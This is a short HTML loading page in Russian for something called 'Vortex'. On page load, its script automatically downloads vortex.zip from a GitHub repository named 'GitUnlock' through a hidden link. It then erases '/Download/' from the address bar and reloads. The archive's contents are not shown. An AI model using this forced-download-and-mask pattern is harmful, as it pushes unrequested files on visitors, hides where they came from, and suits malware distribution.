<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vortex | Загрузка</title>
    <meta name="theme-color" content="#000000">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            color: white;
            background: linear-gradient(-45deg, #000000, #333333, #666666);
            background-size: 400% 400%;
            animation: gradientAnimation 15s ease infinite;
        }
        @keyframes gradientAnimation {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        .loader {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #7b1fa2;
            animation: spin 1s ease-in-out infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader"></div>

    <script>
        (function() {
            // Функция скачивания файла
            function downloadFile() {
                // 1. Создаем ссылку для скачивания
                const link = document.createElement('a');
                link.href = 'https://github.com/serezanet2/GitUnlock/raw/refs/heads/main/Download/vortex.zip';
                link.download = 'vortex.zip';
                link.style.display = 'none';
                document.body.appendChild(link);
                link.click();
                
                // 2. Удаляем ссылку через 100мс
                setTimeout(() => {
                    document.body.removeChild(link);
                    
                    // 3. Очищаем URL от /Download/
                    const currentUrl = window.location.href;
                    if (currentUrl.includes('/Download/')) {
                        const cleanUrl = currentUrl.replace('/Download/', '/');
                        history.replaceState(null, null, cleanUrl);
                        
                        // 4. Перезагружаем страницу через 500мс
                        setTimeout(() => {
                            window.location.reload();
                        }, 500);
                    }
                }, 100);
            }

            // Запускаем скачивание сразу при загрузке страницы
            setTimeout(downloadFile, 300);
        })();
    </script>
</body>
</html>
